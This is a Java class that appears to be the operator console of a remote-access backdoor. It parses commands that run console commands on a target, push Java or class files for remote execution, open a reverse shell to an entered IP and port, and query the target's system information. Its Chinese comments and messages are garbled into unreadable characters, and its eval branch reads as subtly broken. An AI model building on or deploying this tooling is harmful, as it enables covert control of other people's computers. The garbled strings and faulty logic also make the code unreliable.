package constant;

import regular.Regulars;

import java.io.*;

public class CheckCommands {
    private String type;
    private String input;
    private String breaks;
    private boolean continueInput;

    public CheckCommands(BufferedReader sin, String type, String input) throws IOException{
        do {
            //��ʼ��
            this.input = "";
            this.breaks = "";
            this.continueInput = false;
            //����ָ���У��
            input = sin.readLine();
            if (Commands.HELP.equals(input) || "\\h".equals(input)) {
    //            System.out.println("Ĭ��ģʽcmd����ִ�п���̨����");
    //            System.out.println("�л�ģʽ��\\use cmd��ִ�п���̨���Ĭ�ϣ���\\use eval���������ִ�У���\\use rshell������shell����\\getInitInfo���鿴Ŀ�����ϵͳ�汾��Ϣ����\\shutdown���˳�����ˣ�");
                System.out.println("���1ִ�п���̨���Ĭ�ϣ���2����shell��3�˳�����ˣ�4����ֹͣ����ʱ��");
                this.continueInput = true;
            }else if (Commands.SHUTDOWN.equals(input) || Commands.STOP.equals(input) || "3".equals(input)) {
                System.out.println("ȷ���˳�����ˣ�y/N");
                input = sin.readLine();
                if("y".equals(input) || "Y".equals(input)){
                    System.out.println("���˳�");
                    this.breaks = "break";
                }else{
                    this.continueInput = true;
                    input = "cmd";
                    System.out.println("�ص�Ĭ��ģʽ");
                }
            }else if("\\setDisconnect".equals(input) || "4".equals(input)){
                type = "disconnect";
                System.out.println("�����ý�ֹ����ʱ�䣨��λ�룩��ֵ-1Ϊ���á�0ȡ���ò�����");
                input = sin.readLine();
                while ((!input.matches("^(|[1-9][0-9]*)$")) && !"0".equals(input)){
                    System.out.println("��������ȷʱ���ʽ����λ�룬ֵ-1Ϊ���á�0ȡ���ò�����");
                    input = sin.readLine();
                    System.out.println(input.concat("���ڣ�Ŀ�겻����Ӧ��������"));
                }
                if("0".equals(input)){
                    System.out.println("������ȡ��");
                    this.continueInput = true;
                }
            }

            if (Commands.USE_CMD.equals(input) || "1".equals(input)) {
                type = "cmd";
                System.out.println("�л���Ĭ��ģʽ");
                this.continueInput = true;
            } else if (Commands.USE_EVAL.equals(input)) {
                type = "eval";
                System.out.println("�л�����eval");
                System.out.println("������ִ���ļ�·������ʽ��/usr/test.java���ļ����뷽ʽGBK��");
                this.continueInput = true;
                if(input.equals("quit") || input.equals("exit")){
                    System.out.println("�л���Ĭ��ģʽ");
                    type = "cmd";
                    this.continueInput = true;
                }else{
                    String fileName = "";
                    if(input.lastIndexOf("/") != -1){
                        fileName = input.substring(input.lastIndexOf("/") + 1);
                    }else if(input.lastIndexOf("\\") != -1){
                        fileName = input.substring(input.lastIndexOf("\\") + 1);
                    }
                    String read = "";
                    if(fileName.indexOf(".java") != -1){
                        BufferedReader in = new BufferedReader(new InputStreamReader(new FileInputStream(input),"GBK"));
                        String str = null;
                        while ((str = in.readLine()) != null) {
                            read += str;
                        }
                        in.close();
                    }else if(fileName.indexOf(".class") != -1){
                        BufferedInputStream in = new BufferedInputStream(new FileInputStream(input));
                        byte[] bytes = new byte[1024];
                        int len;
                        while ((len = in.read(bytes)) != -1) {
                            read += new String(bytes,0,len);

                        }
                        in.close();
                    }
                    input = fileName.concat("###:###").concat(read);
                }
            } else if (Commands.RSHELL.equals(input) || "2".equals(input)) {
                type = "rshell";
                System.out.println("�����÷���shell���ն�ip���˿ڡ�\r\n��ʽ�磺x.x.x.x:1234 �� x.x.x.x 1234\r\n���˳���ǰģʽ��ִ�У�exit��quit");
                input = sin.readLine();
                //��ʽУ��
                while (!Regulars.regRshell(input)){
                    if(input.equals("quit") || input.equals("exit")){
                        System.out.println("�л���Ĭ��ģʽ");
                        type = "cmd";
                        this.continueInput = true;
                        break;
                    }else {
                        System.err.println("��������ȷ��ʽ��\r\n��ʽ�磺x.x.x.x:1234 �� x.x.x.x 1234\r\n���˳���ǰģʽ��ִ�У�exit��quit");
                        input = sin.readLine();
                    }
                }
            } else if("\\getInitInfo".equals(input)){
                type = input;
            }
        } while (continueInput);

        this.type = type;
        this.input = input;
    }

    public String getType() {
        return type;
    }

    public String getInput() {
        return input;
    }

    public String getBreaks() {
        return breaks;
    }
}
